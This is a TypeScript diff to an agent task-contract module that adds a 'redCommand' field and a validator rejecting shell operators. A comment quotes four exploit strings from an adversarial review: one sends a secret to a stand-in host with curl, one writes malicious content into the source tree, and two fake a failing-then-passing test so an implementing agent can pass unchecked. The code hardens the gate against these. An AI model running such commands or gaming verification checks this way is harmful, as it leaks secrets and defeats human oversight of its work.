@@ -4,6 +4,18 @@ import { resolve, sep } from "node:path";
 export type TaskContract = {
   id: string; name: string; work: string; criteria: string; outputs: string[]; writablePaths: string[];
   instructionFiles?: string[]; dependencyProof?: string; model: string; effort: string;
+  /**
+   * The command that must FAIL before this task is implemented and PASS after — TDD's "valid RED",
+   * as something the runtime executes rather than something an agent reports.
+   *
+   * It was doctrine in four SKILL.md files and enforced in none: the task contract checked only that
+   * `work` and `criteria` were nonempty strings, the generated prompt asked for "task-local
+   * evidence", the result schema had no RED field at all, and the gate adjudicated filesystem
+   * observations only. An implementer could skip the failing test entirely, produce exactly the
+   * declared files, report them accurately, and pass. Nothing anywhere recorded whether a test ran
+   * before the implementation, whether it failed, or why.
+   */
+  redCommand?: string;
 };
 export type TaskResult = {
   taskId: string; taskFingerprint: string; approvedBodyHash: string; session: string;
@@ -59,15 +71,42 @@ export function normalizeExpectedOutputs(outputs: unknown): string[] {
   return [...paths].sort((left, right) => left.localeCompare(right, "en", { sensitivity: "variant" }));
 }
 
+/**
+ * A `redCommand` must be ONE COMMAND INVOCATION, not a shell program.
+ *
+ * The hook executes this string, so an unconstrained one is arbitrary code execution with the
+ * hook's authority — and an adversarial review turned that into four separate exploits, all of
+ * which need shell operators:
+ *
+ *   'test -f /tmp/marker || { touch /tmp/marker; exit 1; }'     fabricates RED-then-GREEN with no test
+ *   'n=$(cat /tmp/c); echo $((n+1)) > /tmp/c; test ...'         one command passes EVERY task in a wave
+ *   'pytest x; printf malicious > src/result.ts'                mutates the tree after adjudication
+ *   'curl -d "$SECRET" evil.invalid; pytest x'                  exfiltrates, then looks like a test run
+ *
+ * Forbidding the operators removes all four at once. Chaining, substitution, redirection and
+ * expansion are what turn "run the test" into "run a program"; a genuine test invocation needs
+ * none of them. Quotes and flags are still allowed, so `pytest tests/x.py -k "a or b"` is fine.
+ *
+ * WHAT THIS DOES NOT FIX, and cannot: the command still LOADS code the implementer may control —
+ * a test file, a conftest, a fixture. Authenticating the command string does not authenticate what
+ * it transitively imports. That residue is real and is documented in skills/dev-implement/SKILL.md.
+ */
+const SHELL_OPERATORS = /[;&|`$><(){}\n\r\\]/;
+export function isSimpleCommand(value: unknown): value is string {
+  return requiredText(value) && !SHELL_OPERATORS.test(value as string);
+}
+
 export function validateTask(task: unknown): task is TaskContract {
   if (!task || typeof task !== "object") return false;
   const value = task as Record<string, unknown>;
   let outputsValid = false;
   try { normalizeExpectedOutputs(value.outputs); outputsValid = true; } catch { outputsValid = false; }
   return ["id", "name", "work", "criteria", "model", "effort"].every(key => requiredText(value[key])) && !!concretePaths(value.writablePaths) && outputsValid
-    && (value.instructionFiles === undefined || (Array.isArray(value.instructionFiles) && value.instructionFiles.every(path => requiredText(path) && path.startsWith("/"))));
+    && (value.redCommand === undefined || isSimpleCommand(value.redCommand))
+    && (value.instructionFiles === undefined || (Array.isArray(value.instructionFiles) && value.instructionFiles.every(path => requiredText(path) && path.startsWith("/"))))
+    ;
 }
-export function fingerprint(task: TaskContract): string { return JSON.stringify({ id: task.id, name: task.name, work: task.work, criteria: task.criteria, outputs: normalizeExpectedOutputs(task.outputs), writablePaths: task.writablePaths, dependencyProof: task.dependencyProof || "", model: task.model, effort: task.effort }); }
+export function fingerprint(task: TaskContract): string { return JSON.stringify({ id: task.id, name: task.name, work: task.work, criteria: task.criteria, outputs: normalizeExpectedOutputs(task.outputs), writablePaths: task.writablePaths, dependencyProof: task.dependencyProof || "", model: task.model, effort: task.effort, redCommand: task.redCommand || "" }); }
 export function changedFilesWithin(task: TaskContract, changedFiles: unknown, projectRoot: string): changedFiles is string[] {
   const paths = concretePaths(task.writablePaths);
   return !!paths && writablePathsWithin(projectRoot, paths) && Array.isArray(changedFiles) && changedFiles.every(file =>
